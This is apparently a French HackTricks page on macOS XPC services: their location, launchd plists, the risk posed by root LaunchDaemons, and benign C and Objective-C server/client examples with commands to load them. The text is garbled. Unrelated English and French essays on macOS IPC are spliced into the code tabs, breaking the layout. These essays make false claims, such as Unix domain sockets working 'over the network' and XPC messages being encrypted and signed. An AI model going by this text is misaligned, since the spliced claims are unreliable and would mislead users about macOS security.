Les composants XPC d'une application sont **à l'intérieur de l'application elle-même**. Par exemple, dans Safari, vous pouvez les trouver dans **`/Applications/Safari.app/Contents/XPCServices`**. Ils ont l'extension **`.xpc`** (comme **`com.apple.Safari.SandboxBroker.xpc`**) et sont **également des bundles** avec le binaire principal à l'intérieur : `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`

Comme vous pouvez le penser, un **composant XPC aura des autorisations et des privilèges différents** des autres composants XPC ou du binaire principal de l'application. SAUF si un service XPC est configuré avec [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) défini sur "True" dans son fichier **Info.plist**. Dans ce cas, le service XPC s'exécutera dans la même session de sécurité que l'application qui l'a appelé.

Les services XPC sont **démarrés** par **launchd** lorsque cela est nécessaire et **arrêtés** une fois que toutes les tâches sont **terminées** pour libérer les ressources système. **Les composants XPC spécifiques à l'application ne peuvent être utilisés que par l'application**, réduisant ainsi le risque associé aux vulnérabilités potentielles.

### Services XPC système

Les services XPC système sont accessibles à tous les utilisateurs. Ces services, soit launchd soit de type Mach, doivent être **définis dans des fichiers plist** situés dans des répertoires spécifiés tels que **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** ou **`/Library/LaunchAgents`**.

Ces fichiers plist auront une clé appelée **`MachServices`** avec le nom du service, et une clé appelée **`Program`** avec le chemin d'accès au binaire :
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Program</key>
<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
<key>AbandonProcessGroup</key>
<true/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.jamf.management.daemon</string>
<key>MachServices</key>
<dict>
<key>com.jamf.management.daemon.aad</key>
<true/>
<key>com.jamf.management.daemon.agent</key>
<true/>
<key>com.jamf.management.daemon.binary</key>
<true/>
<key>com.jamf.management.daemon.selfservice</key>
<true/>
<key>com.jamf.management.daemon.service</key>
<true/>
</dict>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Ceux dans **`LaunchDameons`** sont exécutés par root. Donc, si un processus non privilégié peut communiquer avec l'un d'entre eux, il pourrait être en mesure d'escalader les privilèges.

### Messages d'événements XPC

Les applications peuvent **s'abonner** à différents **messages d'événements**, leur permettant d'être **initiées à la demande** lorsque de tels événements se produisent. La **configuration** de ces services est effectuée dans des fichiers **plist de lancement**, situés dans les **mêmes répertoires que les précédents** et contenant une clé supplémentaire **`LaunchEvent`**.

### Vérification du processus de connexion XPC

Lorsqu'un processus essaie d'appeler une méthode via une connexion XPC, le **service XPC doit vérifier si ce processus est autorisé à se connecter**. Voici les moyens courants de vérifier cela et les pièges courants :

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### Autorisation XPC

Apple permet également aux applications de **configurer certains droits et la manière de les obtenir** afin que si le processus appelant les possède, il serait **autorisé à appeler une méthode** du service XPC :

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### Exemple de code C

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "message");
printf("Received message: %s\n", received_message);

// Create a response dictionary
xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(response, "received", "received");

// Send response
xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
xpc_connection_send_message(remote, response);

// Clean up
xpc_release(response);
}
}

static void handle_connection(xpc_connection_t connection) {
xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
handle_event(event);
});
xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
dispatch_get_main_queue(),
XPC_CONNECTION_MACH_SERVICE_LISTENER);
if (!service) {
fprintf(stderr, "Failed to create service.\n");
exit(EXIT_FAILURE);
}

xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
xpc_type_t type = xpc_get_type(event);
if (type == XPC_TYPE_CONNECTION) {
handle_connection(event);
}
});

xpc_connection_resume(service);
dispatch_main();

return 0;
}
```
{% endtab %}

{% tab title="xpc_server.c" %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "received");
printf("Received message: %s\n", received_message);
}
});

xpc_connection_resume(connection);

xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(message, "message", "Hello, Server!");

xpc_connection_send_message(connection, message);

dispatch_main();

return 0;
}
```
{% endtab %}

{% tab title="xyz.hacktricks.service.plist" %}

# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate with each other and share data. macOS provides several IPC mechanisms, including:

- **Mach ports**: A low-level IPC mechanism that allows processes to send messages to each other.
- **Unix domain sockets**: A mechanism that allows processes to communicate with each other over the network.
- **Distributed Objects**: A high-level IPC mechanism that allows objects to be passed between processes.

## Mach Ports

Mach ports are a low-level IPC mechanism that allows processes to send messages to each other. Mach ports are used extensively by macOS to implement various system services, such as the WindowServer, launchd, and the kernel itself.

Mach ports are identified by a 32-bit integer called a port name. When a process creates a Mach port, it is given a port name that is unique within the process. The process can then send messages to other processes by sending them the port name.

Mach ports can be used to perform various tasks, such as:

- **Task port**: A Mach port that represents a process. A process can use its own task port to perform various operations on itself, such as reading and writing its memory, suspending and resuming itself, and terminating itself.
- **Thread port**: A Mach port that represents a thread within a process. A process can use a thread port to perform various operations on the thread, such as suspending and resuming it, and getting information about its state.
- **Task access port**: A Mach port that represents a process and allows another process to perform operations on it. For example, a debugger can use a task access port to read and write the memory of the process being debugged.
- **Notification port**: A Mach port that is used to receive notifications from the kernel or other processes. For example, a process can create a notification port and register it with the kernel to receive notifications when certain events occur, such as a file being modified.

Mach ports are a powerful IPC mechanism that can be used to perform a wide range of tasks. However, they can also be a security risk if not used properly. For example, if a process exposes a Mach port that allows another process to perform operations on it without proper authentication and authorization, it can lead to privilege escalation and other security issues.

## Unix Domain Sockets

Unix domain sockets are a mechanism that allows processes to communicate with each other over the network. Unlike regular network sockets, Unix domain sockets are implemented entirely within the kernel and do not require any network stack processing.

Unix domain sockets are identified by a file path on the filesystem. When a process creates a Unix domain socket, it creates a file on the filesystem that represents the socket. Other processes can then connect to the socket by opening the file and sending messages to it.

Unix domain sockets can be used to perform various tasks, such as:

- **Inter-process communication**: Processes can use Unix domain sockets to communicate with each other and share data.
- **Daemonization**: A process can create a Unix domain socket and listen for connections on it. When another process connects to the socket, the first process can fork itself and continue running as a daemon, while the second process communicates with the daemon over the socket.
- **Locking**: Processes can use Unix domain sockets to implement locking mechanisms that allow multiple processes to coordinate access to a shared resource.

Unix domain sockets are a powerful IPC mechanism that can be used to perform a wide range of tasks. However, they can also be a security risk if not used properly. For example, if a process creates a Unix domain socket with insecure permissions, it can allow unauthorized access to sensitive data or functionality.

## Distributed Objects

Distributed Objects is a high-level IPC mechanism that allows objects to be passed between processes. Distributed Objects is built on top of Mach ports and provides a simple and convenient way for processes to communicate with each other.

Distributed Objects allows objects to be passed between processes by serializing them into a binary format and sending them over Mach ports. The receiving process then deserializes the object and can use it as if it were a local object.

Distributed Objects can be used to perform various tasks, such as:

- **Inter-process communication**: Processes can use Distributed Objects to communicate with each other and share data.
- **Remote procedure calls**: Processes can use Distributed Objects to call methods on objects in other processes.
- **Shared objects**: Processes can use Distributed Objects to share objects between them, allowing them to coordinate their actions.

Distributed Objects is a powerful IPC mechanism that can be used to perform a wide range of tasks. However, it can also be a security risk if not used properly. For example, if a process exposes a Distributed Object that allows another process to perform operations on it without proper authentication and authorization, it can lead to privilege escalation and other security issues.

## References

- [Mach Ports Programming Guide](https://developer.apple.com/library/archive/documentation/General/Conceptual/ConcurrencyProgrammingGuide/Introduction/Introduction.html#//apple_ref/doc/uid/TP40008091-CH1-SW1)
- [Unix Domain Sockets Programming Guide](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/UnixDomainSockets/Introduction/Introduction.html#//apple_ref/doc/uid/TP40010795-CH1-SW1)
- [Distributed Objects Programming Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/Introduction/Introduction.html#//apple_ref/doc/uid/10000034i-CH1-SW1)

{% endtab %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.service</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### Exemple de code ObjectiveC

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
NSLog(@"Received message: %@", some_string);
NSString *response = @"Received";
reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

MyXPCObject *my_object = [MyXPCObject new];

newConnection.exportedObject = my_object;

[newConnection resume];
return YES;
}
@end

int main(void) {

NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

id <NSXPCListenerDelegate> delegate = [MyDelegate new];
listener.delegate = delegate;
[listener resume];

sleep(10); // Fake something is done and then it ends
}
```
{% endtab %}

{% tab title="oc_xpc_server.m" %}# macOS IPC (Inter-Process Communication)

La communication inter-processus (IPC) est un mécanisme qui permet à des processus de communiquer entre eux. Sur macOS, IPC est implémenté via XPC (eXtensible Procedure Call), qui est un système de communication de processus léger et sécurisé.

XPC est utilisé pour la communication entre les processus de l'espace utilisateur et les démons de l'espace noyau. Les démons de l'espace noyau sont des processus qui s'exécutent en mode privilégié et qui fournissent des services système. Les processus de l'espace utilisateur peuvent communiquer avec les démons de l'espace noyau via XPC.

XPC utilise des connexions pour la communication entre les processus. Une connexion est un canal de communication bidirectionnel entre un client et un serveur. Les clients envoient des messages aux serveurs via des connexions, et les serveurs répondent aux messages via les mêmes connexions.

Les connexions XPC sont sécurisées par défaut. Les messages envoyés via les connexions sont chiffrés et signés pour empêcher les attaques de type man-in-the-middle et les attaques de falsification de messages.

Les connexions XPC sont également isolées les unes des autres. Cela signifie que si un processus est compromis, il ne peut pas accéder aux connexions d'autres processus.

Cependant, les connexions XPC peuvent être vulnérables aux attaques de fuite d'informations. Si un processus envoie des données sensibles via une connexion XPC non sécurisée, un attaquant peut intercepter ces données et les lire.

Dans cette section, nous allons examiner comment utiliser XPC pour la communication inter-processus sur macOS, ainsi que les vulnérabilités potentielles associées à l'utilisation de XPC.
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
[connection resume];

[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}];

[[NSRunLoop currentRunLoop] run];

return 0;
}
```
{% endtab %}

{% tab title="macOS IPC (Inter-Process Communication)" %}
# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate with each other and share data. macOS provides several IPC mechanisms, including:

* Mach ports
* UNIX domain sockets
* Distributed Objects
* XPC services

Each of these mechanisms has its own strengths and weaknesses, and can be used for different purposes. In this section, we will focus on Mach ports and UNIX domain sockets, as they are the most commonly used IPC mechanisms on macOS.

## Mach Ports

Mach ports are a low-level IPC mechanism provided by the Mach kernel. They are used extensively by macOS and iOS to implement various system services and APIs. Mach ports are similar to UNIX file descriptors in that they are represented by small integers that can be passed between processes. However, unlike file descriptors, Mach ports can be used to send and receive messages between processes.

Mach ports can be either send rights or receive rights. A send right allows a process to send messages to a port, while a receive right allows a process to receive messages from a port. When a process creates a port, it is given both a send right and a receive right. The process can then pass the send right to another process, allowing that process to send messages to the port. Similarly, the process can pass the receive right to another process, allowing that process to receive messages from the port.

Mach ports can be used to implement a wide range of IPC mechanisms, including:

* Remote procedure calls (RPC)
* Distributed notifications
* Distributed objects
* Distributed file systems

Mach ports are a powerful IPC mechanism, but they can also be a source of security vulnerabilities. For example, if a process has a send right to a port that is used by a system service, it may be able to send malicious messages to the service and cause it to execute arbitrary code. Similarly, if a process has a receive right to a port that is used by a system service, it may be able to receive sensitive information from the service.

## UNIX Domain Sockets

UNIX domain sockets are a high-level IPC mechanism provided by the UNIX operating system. They are widely used on macOS and other UNIX-based systems to implement various system services and APIs. UNIX domain sockets are similar to network sockets in that they provide a bidirectional communication channel between processes. However, unlike network sockets, UNIX domain sockets are implemented entirely within the operating system and do not require any network hardware or protocols.

UNIX domain sockets can be either stream sockets or datagram sockets. Stream sockets provide a reliable, byte-stream-oriented communication channel between processes, while datagram sockets provide an unreliable, message-oriented communication channel.

UNIX domain sockets can be used to implement a wide range of IPC mechanisms, including:

* Local RPC
* Local notifications
* Local file systems

UNIX domain sockets are a relatively simple and secure IPC mechanism, but they can still be a source of security vulnerabilities. For example, if a process has access to a socket that is used by a system service, it may be able to send malicious messages to the service and cause it to execute arbitrary code. Similarly, if a process has access to a socket that is used by a system service, it may be able to receive sensitive information from the service.

## Conclusion

IPC is a powerful mechanism that allows processes to communicate with each other and share data. However, it can also be a source of security vulnerabilities if not used properly. When designing and implementing IPC mechanisms, it is important to consider the security implications and take appropriate measures to prevent unauthorized access and malicious use.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.svcoc</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/oc_xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/oc_xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
## Références

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
